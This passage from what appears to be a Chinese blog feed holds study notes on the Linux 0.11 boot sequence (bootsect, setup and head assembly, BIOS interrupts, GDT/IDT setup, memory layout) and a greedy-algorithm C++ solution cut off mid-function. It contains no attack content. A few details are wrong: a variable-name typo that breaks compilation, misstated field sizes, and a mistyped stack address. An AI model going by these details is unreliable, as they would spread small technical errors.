ds、es、fs、gs这几个段寄存器赋值为<strong>0x10</strong>，根据段描述符结构解析，表示这几个段寄存器的值为指向全局描述符表中的第二个段描述符，也就是数据段描述符。</p><p>最后 <strong>lss</strong> 指令相当于让 <strong>ss:esp</strong>这个栈顶指针指向了 **_stack_start**这个标号的位置。还记得图里的那个原来的栈顶指针在哪里吧？往上翻一下，<strong>0x9FF00</strong>，现在要变咯。</p><p>这个 stack_start 标号定义在了很久之后才会讲到的<strong>sched.c</strong> 里，我们这里拿出来分析一波。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">long user_stack[4096 &gt;&gt; 2];<br><br>struct<br>&#123;<br>  long *a;<br>  short b;<br>&#125;<br>stack_start = &#123;&amp;user_stack[4096 &gt;&gt; 2], 0x10&#125;;<br></code></pre></td></tr></table></figure><p>首先，stack_start 结构中的高位 8 字节是<strong>0x10</strong>，将会赋值给 <strong>ss</strong> 栈段寄存器，低位16 字节是 <strong>user_stack</strong>这个数组的最后一个元素的地址值，将其赋值给 <strong>esp</strong>寄存器。</p><p>赋值给 ss 的 0x10仍然按照保护模式下的<strong>段选择子</strong>去解读，其指向的是全局描述符表中的第二个段描述符（数据段描述符），段基址是0。</p><p>赋值给 esp 寄存器的就是 user_stack数组的最后一个元素的内存地址值，那最终的<strong>栈顶地址</strong>，也指向了这里（user_stack+ 0），后面的压栈操作，就是往这个新的栈顶地址处压咯。</p><p>继续往下看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">call setup_idt ;设置中断描述符表<br>call setup_gdt ;设置全局描述符表<br>mov eax,10h<br>mov ds,ax<br>mov es,ax<br>mov fs,ax<br>mov gs,ax<br>lss esp,_stack_start<br></code></pre></td></tr></table></figure><p>先设置了 <strong>idt</strong> 和<strong>gdt</strong>，然后又重新执行了一遍刚刚执行过的代码。</p><p>为什么要重新设置这些段寄存器呢？因为上面修改了gdt，所以要重新设置一遍以刷新才能生效。那我们接下来就把目光放到设置 idt和 gdt 上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asm">setup_idt:<br>    lea edx,ignore_int<br>    mov eax,00080000h<br>    mov ax,dx<br>    mov dx,8E00h<br>    lea edi,_idt<br>    mov ecx,256<br>rp_sidt:<br>    mov [edi],eax<br>    mov [edi+4],edx<br>    add edi,8<br>    dec ecx<br>    jne rp_sidt<br>    lidt fword ptr idt_descr<br>    ret<br><br>idt_descr:<br>    dw 256*8-1<br>    dd _idt<br><br>_idt:<br>    DQ 256 dup(0)<br></code></pre></td></tr></table></figure><p>中断描述符表 idt里面存储着一个个中断描述符，每一个中断号就对应着一个中断描述符，而中断描述符里面存储着主要是中断程序的地址，这样一个中断号过来后，CPU就会自动寻找相应的中断程序，然后去执行它。</p><p>那这段程序的作用就是，<strong>设置了 256个中断描述符</strong>，并且让每一个中断描述符中的中断程序例程都指向一个<strong>ignore_int</strong>的函数地址，这个是个<strong>默认的中断处理程序</strong>，之后会逐渐被各个具体的中断程序所覆盖。比如之后键盘模块会将自己的键盘中断处理程序，覆盖过去。</p><p>那现在，产生任何中断都会指向这个默认的函数ignore_int，也就是说现在这个阶段<strong>你按键盘还不好使</strong>。</p><p>设置中断描述符表 setup_idt 说完了，那接下来<strong>setup_gdt</strong>就同理了。我们就直接看设置好后的新的全局描述符表长什么样吧？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">_gdt:<br>    DQ 0000000000000000h    ;/* NULL descriptor */<br>    DQ 00c09a0000000fffh    ;/* 16Mb */<br>    DQ 00c0920000000fffh    ;/* 16Mb */<br>    DQ 0000000000000000h    ;/* TEMPORARY - don&#x27;t use */<br>    DQ 252 dup(0)<br></code></pre></td></tr></table></figure><p>其实和我们原先设置好的 gdt 一模一样。</p><p>也是有<strong>代码段描述符</strong>和<strong>数据段描述符</strong>，然后第四项系统段描述符并没有用到，不用管。最后还留了252 项的空间，这些空间后面会用来放置<strong>任务状态段描述符TSS</strong> 和<strong>局部描述符 LDT</strong>，这个后面再说。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-16780010789377.png" class="" title="图片"><p>因为原来设置的 gdt 是在 setup程序中，之后这个地方要被缓冲区覆盖掉，所以这里重新设置在 head程序中，这块内存区域之后就不会被其他程序用到并且覆盖了。</p><img src="/2023/03/03/OperatingSystem/Operating-system-source-code-2/640-167800110702310.png" class="" title="图片">]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>你管这破玩意儿叫操作系统源码(一)</title>
    <link href="/2023/02/28/OperatingSystem/Operating-system-source-code/"/>
    <url>/2023/02/28/OperatingSystem/Operating-system-source-code/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文为学习<ahref="https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&amp;__biz=Mzk0MjE3NDE0Ng==&amp;scene=1&amp;album_id=2123743679373688834&amp;count=3#wechat_redirect">操作系统统源码(低并发编程)</a>所作笔记，仅供学习参考，不做任何商业用途,若有侵权，请联系删除。</p></blockquote><h1 id="第一回-最开始的两行代码">第一回 | 最开始的两行代码</h1><blockquote><p><ahref="https://mp.weixin.qq.com/s?__biz=Mzk0MjE3NDE0Ng==&amp;mid=2247499226&amp;idx=1&amp;sn=1ff3d54a3608423b7781142ae3ac62ca&amp;chksm=c2c58777f5b20e61664a51d31ab779bbe68c317c3459218c7cd4b9530887dbb33470628c3248&amp;scene=178&amp;cur_album_id=2123743679373688834#rd">你管这破玩意叫操作系统源码| 第一回 最开始的两行代码 (qq.com)</a></p></blockquote><p>当你按下开机键的那一刻，在主板上提前写死的固件程序<strong>BIOS</strong> 会将硬盘中<strong>启动区的 512字节</strong>的数据，原封不动复制到<strong>内存中的 0x7c00</strong>这个位置，并跳转到那个位置进行执行。</p><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640.png" class="" title="图片"><ul><li>启动区的定义<ul><li>0盘0道0扇区的512字节的最后两个字节是<strong>0x55</strong>和<strong>0xaa</strong>,便会被BIOS作为一个启动区</li></ul></li></ul><p>在Linux-0.11的最开始的代码中，启动区代码文件位于<strong>boot</strong>文件夹下。</p><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640-16775752966583.png" class="" title="图片"><p>通过编译，这个 bootsect.s会被编译成二进制文件，存放在启动区的第一扇区。</p><p><code>bootsect.s</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov ax, 0x07c0# x86架构在16位的实模式下可以访问2位的地址线，从而ds得到的短地址左移四位会变为0x7c00，与BIOS加载到内存的地址一致<br>mov ds, ax# ds为16位段寄存器，内存寻址充当段基址的作用<br></code></pre></td></tr></table></figure><h1 id="第二回-自己给自己挪个地儿">第二回 | 自己给自己挪个地儿</h1><blockquote><p><ahref="https://mp.weixin.qq.com/s?__biz=Mzk0MjE3NDE0Ng==&amp;mid=2247499274&amp;idx=1&amp;sn=23885b5b1344a1425f5a971d06ad2e7d&amp;chksm=c2c584a7f5b20db1b0a75ea896e7218a9f8bcd006e68f53693bab240b13f9e2fb0ec0c9b9a6a&amp;cur_album_id=2123743679373688834&amp;scene=189#wechat_redirect">你管这破玩意叫操作系统源码| 第二回 自己给自己挪个地儿 (qq.com)</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov ax,0x07c0<br>mov ds,ax<br>mov ax,0x9000<br>mov es,ax<br>mov cx,#256<br>sub si,si<br>sub di,di<br>rep movw<br></code></pre></td></tr></table></figure><p>经过这些指令后，以下几个寄存器分别被附上了指定的值</p><ul><li><strong>ds = 0x07c0</strong></li><li><strong>es = 0x9000</strong></li><li><strong>cx = 256</strong></li><li><strong>si = 0</strong></li><li><strong>di = 0</strong></li></ul><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640.png" class="" title="图片"><p>为这里寄存器赋值都是为下一条指令服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">rep movw<br></code></pre></td></tr></table></figure><p><strong>rep</strong> 表示重复执行后面的指令</p><p><strong>movw</strong> 表示复制一个字（16bits）</p><p>该指令<strong>就是不断重复地复制一个字。</strong></p><ul><li>重复次数：cx寄存器中的值，256次</li><li>从哪复制到哪：ds:si -&gt; es:di</li><li>一次复制多少： 复制一个字，16bit</li></ul><p><strong>将内存地址 0x7c00 处开始往后的 512 字节的数据，原封不动复制到0x90000 处</strong>。</p><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640-16775837503485.png" class="" title="图片"><p>现在，操作系统最开头的代码，已经被挪到了 <strong>0x90000</strong>这个位置了。</p><p>再往后是一个<strong>跳转</strong>指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">jmpi go,0x9000<br>go: <br>  mov ax,cs<br>  mov ds,ax<br></code></pre></td></tr></table></figure><p><strong>jmpi</strong> 是一个<strong>段间跳转指令</strong>，表示跳转到<strong>0x9000:go</strong> 处执行。</p><p><strong>段基址 :偏移地址</strong>，段基址仍然要先左移四位，因此结论就是跳转到<strong>0x90000 + go</strong> 这个内存地址处执行。</p><p>再说 go，go就是一个<strong>标签</strong>，最终编译成机器码的时候会被翻译成一个值，这个值就是go 这个标签在文件内的偏移地址。</p><p>这个偏移地址再加上 0x90000，就刚好是 go 标签后面那段代码 <strong>movax,cs</strong> 此时所在的内存地址了。</p><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640-16775838630138.png" class="" title="图片"><h1 id="第三回-做好最最基础的准备工作">第三回 |做好最最基础的准备工作</h1><blockquote><p><ahref="https://mp.weixin.qq.com/s?__biz=Mzk0MjE3NDE0Ng==&amp;mid=2247499307&amp;idx=1&amp;sn=c94575dde2b9bbdbabe2d7a832aa9ff4&amp;chksm=c2c58486f5b20d907e314fdf88c5c25b8233b44f5a6a2864c418489e7ae993574150e92c9927&amp;scene=178&amp;cur_album_id=2123743679373688834#rd">你管这破玩意叫操作系统源码| 第三回 做好最最基础的准备工作 (qq.com)</a></p></blockquote><p>操作系统的代码最开头的 512字节的数据，从硬盘的启动区先是被移动到了内存 <strong>0x7c00</strong>处，然后又立刻被移动到 <strong>0x90000</strong>处，并且跳转到此处往后再稍稍偏移 <strong>go</strong>这个标签所代表的偏移地址处。</p><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640.png" class="" title="图片"><p><strong>go标签代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">go: mov ax,cs  ; cs表示代码段寄存器，cs=0x9000<br>    mov ds,ax  ; ds数据段寄存器，ds=0x9000<br>    mov es,ax  ; es=0x9000<br>    mov ss,ax  ; ss为栈段寄存器，ss=0x9000<br>    mov sp,#0xFF00  ;sp队长指针，栈顶地址从0x9FF00<br></code></pre></td></tr></table></figure><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640-16777191088463.png" class="" title="图片"><p>至此，操作系统的一些最最最最基础的准备工作就做好了。</p><ol type="1"><li>将代码从硬盘移到0x90000处；</li><li><strong>数据段寄存器ds和代码段寄存器cs</strong>被设置为0x90000；</li><li>栈顶地址被设置为0x9F0000,具体表现为<strong>栈段寄存器 ss</strong> 为0x9000，<strong>栈基址寄存器 sp</strong> 为0xFF00。栈顶地址远远大于此时代码所在的位置0x90000，栈向下发展比较安全。</li></ol><h2 id="扩展">扩展</h2><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640-16777195999146.png" class="" title="图片"><p>所以本回的代码，正如标题所说，就是做好最最基础的准备工作。但要从更伟大的战略意义上讲，它其实是按照Intel手册上要求的，老老实实把这三类段寄存器的值设置好，达到了<strong>初步规划内存</strong>的目的。</p><h1 id="第四回-把自己在硬盘里的其他部分也放到内存来">第四回 |把自己在硬盘里的其他部分也放到内存来</h1><blockquote><p><ahref="https://mp.weixin.qq.com/s?__biz=Mzk0MjE3NDE0Ng==&amp;mid=2247499359&amp;idx=1&amp;sn=233812a464996b9566cdf3258132bc22&amp;chksm=c2c584f2f5b20de40a7990c754cdbf3073b4652f318d479ac0c8ff686ca7aa74eef1ba7c6c2f&amp;cur_album_id=2123743679373688834&amp;scene=189#wechat_redirect">第四回| 把自己在硬盘里的其他部分也放到内存来 (qq.com)</a></p></blockquote><p>上一回简单说，就是设置了如何访问数据的<strong>数据</strong>段，如何访问代码的<strong>代码</strong>段，以及如何访问栈的<strong>栈顶</strong>指针，也即初步做了一次<strong>内存规划</strong>，从CPU 的角度看，访问内存，就这么三块地方而已。</p><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640-16777197550829.png" class="" title="图片"><p>接着往下看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asm">load_setup:<br>    mov dx,#0x0000      ; drive 0, head 0<br>    mov cx,#0x0002      ; sector 2, track 0<br>    mov bx,#0x0200      ; address = 512, in 0x9000<br>    mov ax,#0x0200+4    ; service 2, nr of sectors<br>    int 0x13            ; read it<br>    jnc ok_load_setup       ; ok - continue<br>    mov dx,#0x0000<br>    mov ax,#0x0000      ; reset the diskette<br>    int 0x13<br>    jmp load_setup<br><br>ok_load_setup:<br>    ...<br></code></pre></td></tr></table></figure><ul><li><strong>int指令</strong>，是汇编指令，不是高级语言的整型变量，<code>int 0x13</code>,表示发起<strong>0x13号中断</strong>，这条指令上面给dx,cx, bx, ax赋值都是作为这个终端程序的参数。</li><li>0x13 号中断的处理程序是 BIOS提前给我们写好的，是<strong>读取磁盘</strong>的相关功能的函数。</li></ul><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640-167771997020012.jpeg" class="" title="图片"><p>本段代码的作用就是<strong>就是将硬盘的第 2个扇区开始，把数据加载到内存 0x90200 处，共加载 4 个扇区</strong>。</p><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640-167772017155115.png" class="" title="图片"><p>如果复制成功，则跳转到<strong>ok_load_setup</strong>标签。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">ok_load_setup:<br>    ...<br>    mov ax,#0x1000<br>    mov es,ax       ; segment of 0x10000<br>    call read_it<br>    ...<br>    jmpi 0,0x9020<br></code></pre></td></tr></table></figure><p>这段代码省略了很多非主逻辑的代码，比如在屏幕上输出 Loading system ...这个字符串以防止用户等烦了。</p><p>剩下的主要代码就都写在这里了，就这么几行，其作用是<strong>把从硬盘第6 个扇区开始往后的 240 个扇区，加载到内存 0x10000处</strong>，和之前的从硬盘捣腾到内存是一个道理。</p><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640-167772039072718.png" class="" title="图片"><p>至此，整个操作系统的<strong>全部代码</strong>，就已经全部从硬盘中，被搬迁到内存来了。</p><p>然后又通过一个熟悉的段间跳转指令 jmpi 0,0x9020，跳转到<strong>0x90200</strong> 处，就是硬盘第二个扇区开始处的内容。</p><p><strong>整个操作系统的编译过程</strong></p><p>通过 <strong>Makefile</strong> 和 <strong>build.c</strong>配合完成：</p><p><strong><em>1.</em></strong> 把 bootsect.s 编译成 bootsect 放在硬盘的1 扇区。</p><p><strong><em>2.</em></strong> 把 setup.s 编译成 setup 放在硬盘的 2~5扇区。</p><p><strong><em>3.</em></strong> 把剩下的全部代码（head.s作为开头）编译成 system 放在硬盘的随后 240 个扇区。</p><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640-167772052479421.png" class="" title="图片"><p>所以，我们即将跳转到的内存中的 <strong>0x90200</strong>处的代码，就是从硬盘第二个扇区开始处加载到内存的。第二个扇区的最开始处，那也就是setup.s 文件的第一行代码。</p><p><strong>在操作系统刚刚开始建立的时候，那是完全自己安排前前后后的关系</strong>，一个字节都不能偏，就是这么<strong>强耦合</strong>，需要小心翼翼，需要大脑时刻保持清醒，规划好自己写的代码被编译并存储在硬盘的哪个位置，而随后又会被加载到内存的哪个位置，不能错乱。</p><h1 id="第五回-进入保护模式前的最后一次折腾内存">第五回 |进入保护模式前的最后一次折腾内存</h1><blockquote><p><ahref="https://mp.weixin.qq.com/s?__biz=Mzk0MjE3NDE0Ng==&amp;mid=2247499558&amp;idx=1&amp;sn=d5d057fae2fb835d38f82804c2649463&amp;chksm=c2c5858bf5b20c9de2db5c31dd34fbe766f6c46cda17f54f4518a75fc1838f2ada6fe5717aad&amp;scene=178&amp;cur_album_id=2123743679373688834#rd">第五回| 进入保护模式前的最后一次折腾内存 (qq.com)</a></p></blockquote><p>操作系统已经完成了各种从硬盘到内存的加载，以及内存到内存的复制。</p><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640.png" class="" title="图片"><p>至此，整个<strong>bootsect.s</strong>的使命就完成了，之后便跳转到了<strong>0x90200</strong>这个位置开始执行，这个位置的代码就是<strong>setup.s</strong>的开头，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">start:<br>    mov ax,#0x9000  ; this is done in bootsect already, but...<br>    mov ds,ax<br>    mov ah,#0x03    ; read cursor pos<br>    xor bh,bh<br>    int 0x10        ; save it in known place, con_init fetches<br>    mov [0],dx      ; it from 0x90000.<br></code></pre></td></tr></table></figure><p><strong>int 0x10</strong></p><ul><li>触发BIOS提供的<strong>显示服务中断处理程序</strong>；</li><li><strong>ah寄存器</strong>，表示显示服务里具体的<strong>读取光标位置功能</strong>。</li></ul><p>int0x10中断程序执行完毕并返回时，<strong>dx寄存器</strong>里的之表示光标的位置，具体来说高八位dh存储了行号，低八位存储了列号。</p><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640-16778276888023.png" class="" title="图片"><p>说明：计算机在加电自检后会自动初始化到文字模式，在这种模式下，整个屏幕可以显示25行，每行80个字符，也就是80列。</p><p><code>mov [0], dx</code>就是把这个光标位置存储在[0]这个内存地址处（段基址ds=0x90000）。这里存放着光标的位置，以便之后在初始化控制台的时候用到。</p><p>这个指令和平时调用方法没什么区别，只不过这里的<strong>寄存器</strong>的用法相当于<strong>入参和返回值</strong>，这里的<strong>0x10中断号</strong>相当于<strong>方法名</strong>。</p><p>这里又应了之前说的一句话，操作系统内核的最开始处处也都是BIOS的<strong>调包侠</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs asm">比如获取内存信息。<br>; Get memory size (extended mem, kB)<br>    mov ah,#0x88<br>    int 0x15<br>    mov [2],ax<br>获取显卡显示模式。<br>; Get video-card data:<br>    mov ah,#0x0f<br>    int 0x10<br>    mov [4],bx      ; bh = display page<br>    mov [6],ax      ; al = video mode, ah = window width<br>检查显示方式并取参数<br>; check for EGA/VGA and some config parameters<br>    mov ah,#0x12<br>    mov bl,#0x10<br>    int 0x10<br>    mov [8],ax<br>    mov [10],bx<br>    mov [12],cx<br>获取第一块硬盘的信息。<br>; Get hd0 data<br>    mov ax,#0x0000<br>    mov ds,ax<br>    lds si,[4*0x41]<br>    mov ax,#INITSEG<br>    mov es,ax<br>    mov di,#0x0080<br>    mov cx,#0x10<br>    rep<br>    movsb<br>获取第二块硬盘的信息。<br>; Get hd1 data<br>    mov ax,#0x0000<br>    mov ds,ax<br>    lds si,[4*0x46]<br>    mov ax,#INITSEG<br>    mov es,ax<br>    mov di,#0x0090<br>    mov cx,#0x10<br>    rep<br>    movsb<br></code></pre></td></tr></table></figure><p>最终存储在内存中的信息是什么，在什么位置，</p><table><thead><tr class="header"><th>内存地址</th><th>长度(字节)</th><th>名称</th></tr></thead><tbody><tr class="odd"><td>0x90000</td><td>2</td><td>光标位置</td></tr><tr class="even"><td>0x90002</td><td>2</td><td>扩展内存数</td></tr><tr class="odd"><td>0x90004</td><td>2</td><td>显示页面</td></tr><tr class="even"><td>0x90006</td><td>1</td><td>显示模式</td></tr><tr class="odd"><td>0x90007</td><td>1</td><td>字符列数</td></tr><tr class="even"><td>0x90008</td><td>2</td><td>未知</td></tr><tr class="odd"><td>0x9000A</td><td>1</td><td>显示内存</td></tr><tr class="even"><td>0x9000B</td><td>1</td><td>显示状态</td></tr><tr class="odd"><td>0x9000C</td><td>2</td><td>显卡特性参数</td></tr><tr class="even"><td>0x9000E</td><td>1</td><td>屏幕行数</td></tr><tr class="odd"><td>0x9000F</td><td>1</td><td>屏幕列数</td></tr><tr class="even"><td>0x90080</td><td>16</td><td>硬盘1参数表</td></tr><tr class="odd"><td>0x90090</td><td>16</td><td>硬盘2参数表</td></tr><tr class="even"><td>0x901FC</td><td>2</td><td>根设备号</td></tr></tbody></table><p>由于之后很快就会用 c 语言进行编程，虽然汇编和 c语言也可以用变量的形式进行传递数据，但这需要编译器在链接时做一些额外的工作，所以这么多数据更方便的还是<strong>双方共同约定一个内存地址</strong>，我往这里存，你从这里取，就完事了。这恐怕是最最原始和直观的变量传递的方式了。</p><p>继续往下看，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">cli         ; no interrupts allowed ;<br></code></pre></td></tr></table></figure><p>因为后面我们要把原本是 BIOS写好的中断向量表给覆盖掉，也就是给破坏掉了，写上我们自己的中断向量表，所以这个时候是不允许中断进来的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asm">; first we move the system to it&#x27;s rightful place<br>    mov ax,#0x0000<br>    cld         ; &#x27;direction&#x27;=0, movs moves forward<br>do_move:<br>    mov es,ax       ; destination segment<br>    add ax,#0x1000<br>    cmp ax,#0x9000<br>    jz  end_move<br>    mov ds,ax       ; source segment<br>    sub di,di<br>    sub si,si<br>    mov cx,#0x8000 repeat times<br>    rep movsw<br>    jmp do_move<br>; then we load the segment descriptors<br>end_move:<br>    ...<br></code></pre></td></tr></table></figure><p><code>rep movsw</code>同前面的原理一样，也是做了个内存复制操作，最终的结果是，把内存地址<strong>0x10000</strong> 处开始往后一直到 <strong>0x90000</strong>的内容，统统复制到内存的最开始的 <strong>0</strong>位置，大概就是这么个效果。</p><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640-16778284441636.png" class="" title="图片"><p>栈顶地址仍然是 <strong>0x9FF00</strong> 没有改变。</p><p><strong>0x90000</strong> 开始往上的位置，原来是<strong>bootsect</strong> 和 <strong>setup</strong> 程序的代码，现bootsect的一部分代码在已经被操作系统为了记录内存、硬盘、显卡等一些<strong>临时存放的</strong>数据给覆盖了一部分。</p><p>内存最开始的 <strong>0</strong> 到 <strong>0x80000</strong> 这 512K被 <strong>system</strong> 模块给占用了，之前讲过，这个 system模块就是除了 bootsect 和 setup之外的全部程序链接在一起的结果，可以理解为<strong>操作系统的全部</strong>。</p><p>那么现在的内存布局就是这个样子。</p><img src="/2023/02/28/OperatingSystem/Operating-system-source-code/640-16778284924179.png" class="" title="图片"><p>接下来，就要进行有点技术含量的工作了，那就是<strong>模式的转换</strong>，需要从现在的16 位的<strong>实模式</strong>转变为之后 32位的<strong>保护模式</strong>，这是一项大工程！</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>贪心算法（二）</title>
    <link href="/2023/02/23/Algorithm/algorithm-10/"/>
    <url>/2023/02/23/Algorithm/algorithm-10/</url>
    
    <content type="html"><![CDATA[<h1 id="贪心算法二">贪心算法（二）</h1><blockquote><p><a href="https://programmercarl.com/">代码随想录</a></p></blockquote><h2 id="无重叠区间">无重叠区间</h2><p><ahref="https://leetcode.cn/problems/non-overlapping-intervals/">435.无重叠区间 - 力扣（Leetcode）</a></p><p><strong>按照右边界排序，从左向右记录非交叉区间的个数。最后用区间总数减去非交叉区间的个数就是需要移除的区间个数了。</strong></p><img src="/2023/02/23/Algorithm/algorithm-10/20230201164134.png" class="" title="img"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 按照区间右边界排序</span><br>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; a, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; b)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> a[<span class="hljs-number">1</span>] &lt; b[<span class="hljs-number">1</span>];<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">eraseOverlapIntervals</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; intervals)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (interval.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">sort</span>(intervals.<span class="hljs-built_in">begin</span>(), intervals.<span class="hljs-built_in">end</span>(), cmp);<br>        <span class="hljs-type">int</span> count = <span class="hljs-number">1</span>;  <span class="hljs-comment">// 记录非交叉区间的个数</span><br>        <span class="hljs-type">int</span> end = intervals[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; intervals.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>            <span class="hljs-keyword">if</span> (end &lt;= intervals[i][<span class="hljs-number">0</span>]) &#123;<br>                end = intervals[i][<span class="hljs-number">1</span>];<br>                count ++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> intervals.<span class="hljs-built_in">size</span>() - count;<br>    